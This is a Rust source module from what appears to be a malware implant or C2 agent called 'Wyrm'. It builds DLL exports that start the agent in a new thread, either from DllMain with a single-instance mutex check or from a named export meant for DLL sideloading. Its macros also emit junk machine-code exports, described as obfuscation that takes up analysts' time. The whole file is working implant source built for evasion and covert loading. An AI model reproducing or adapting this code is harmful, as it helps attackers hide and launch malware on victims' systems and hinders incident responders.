//! A module for creating either fake exports full of junk, or exports which
//! lead to the running of the agent, customisable via profiles - thanks to the
//! magic of macros.
//!
//! This module would be used for two main reasons:
//!
//! 1) Obfuscation: If you wish to obfuscate the binary by enforcing a number of random
//! exports which take analyst time up to review, then you may wish to add a number of
//! junk export functions.
//!
//! 2) Custom entrypoint: If you wish a custom entrypoint which is not `run`, this will
//! allow you to define that - and it will come in handy for custom DLL sideloading.
//

use core::arch::naked_asm;
use std::{ffi::c_void, mem::transmute, ptr::null_mut, sync::atomic::Ordering};

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, HINSTANCE},
    Storage::FileSystem::SYNCHRONIZE,
    System::{
        SystemServices::DLL_PROCESS_ATTACH,
        Threading::{CreateThread, LPTHREAD_START_ROUTINE, Sleep},
        WindowsProgramming::OpenMutexA,
    },
};

use crate::{
    entry::{APPLICATION_RUNNING, start_wyrm},
    utils::{allocate::ProcessHeapAlloc, strings::generate_mutex_name},
};

pub fn internal_dll_start(start_type: StartType) {
    match start_type {
        StartType::DllMain => start_in_os_thread_mutex_check(),
        StartType::FromExport => {
            if !APPLICATION_RUNNING.load(Ordering::SeqCst) {
                start_in_os_thread_no_mutex_check();
            }

            loop {
                unsafe { Sleep(1000) };
            }
        }
    }
}

fn start_in_os_thread_no_mutex_check() {
    unsafe {
        let start = transmute::<LPTHREAD_START_ROUTINE, LPTHREAD_START_ROUTINE>(Some(runpoline));
        let handle = CreateThread(null_mut(), 0, start, null_mut(), 0, null_mut());

        if !handle.is_null() {
            APPLICATION_RUNNING.store(true, Ordering::SeqCst);
        }
    }
}

unsafe extern "system" fn runpoline(_p1: *mut c_void) -> u32 {
    start_wyrm();

    0
}

fn start_in_os_thread_mutex_check() {
    // If the mutex already exists we dont want to continue setting up Wyrm so just return out the DllMain
    if check_mutex().is_some() {
        return;
    }

    start_in_os_thread_no_mutex_check();
}

/// Returns `Some(())` if the mutex exists on the system
fn check_mutex() -> Option<()> {
    let mutex: &str = option_env!("MUTEX").unwrap_or_default();
    if mutex.is_empty() {
        return None;
    }

    let mtx_name = generate_mutex_name(mutex);

    let existing_handle = unsafe { OpenMutexA(SYNCHRONIZE, FALSE, mtx_name.as_ptr() as *const u8) };

    if !existing_handle.is_null() {
        unsafe { CloseHandle(existing_handle) };
        return Some(());
    }

    None
}

#[allow(dead_code)]
pub enum StartType {
    DllMain,
    FromExport,
}

macro_rules! build_dll_export_by_name_start_wyrm {
    ($name:ident) => {
        #[unsafe(no_mangle)]
        unsafe extern "system" fn $name() {
            internal_dll_start(StartType::FromExport);
        }
    };
}

macro_rules! build_dll_export_by_name_junk_machine_code {
    ($name:ident, $($b:expr),+ $(,)?) => {
        #[unsafe(no_mangle)]
        #[unsafe(naked)]
        unsafe extern "system" fn $name() {
            naked_asm!(
                $(
                    concat!(".byte ", stringify!($b)),
                )+
            )
        }
    };
}

include!(concat!(env!("OUT_DIR"), "/custom_exports.rs"));
